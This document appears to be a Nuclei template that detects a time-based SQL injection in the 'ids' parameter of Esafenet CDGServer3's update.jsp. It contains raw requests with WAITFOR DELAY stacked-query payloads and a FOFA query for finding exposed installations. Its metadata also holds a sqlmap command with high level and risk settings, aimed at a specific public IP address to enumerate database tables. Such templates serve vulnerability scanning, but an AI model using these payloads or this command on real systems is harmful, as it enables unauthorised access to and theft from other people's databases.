id: esafenet-cdgserver3-update-sqli

info:
  name: esafenet update.jsp - sqli
  author: leadlife
  severity: high
  description: 
  reference: 
    - 
  metadata:
    verified: true
    tips: 延迟不是 waitfor 多少就是多少，有倍数扩大
    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
    sqlmap: sqlmap -u "http://183.217.123.138:8060/CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=*" --batch --level 5 --risk 3 --random-agent --tables
  tags: esafenet,sqli,time
  
http:
  - raw:
      - |
        GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=-1,3);WAITFOR%20DELAY%20%270:0:0%27-- HTTP/1.1 
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Connection: close

      - |
        GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3);WAITFOR%20DELAY%20%270:0:1%27-- HTTP/1.1 
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

      - |
        GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3);WAITFOR%20DELAY%20%270:0:2%27-- HTTP/1.1 
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    matchers:
      - type: dsl
        dsl:
          - "duration_1 < duration_2 && contains_all(body_1,'当前','激活','可用') && status_code_1==200"
          - "duration_2 < duration_3 && contains_all(body_2,'当前','激活','可用') && status_code_2==200"
          - "contains_all(body_3,'当前','激活','可用') && status_code_3==200"
        condition: and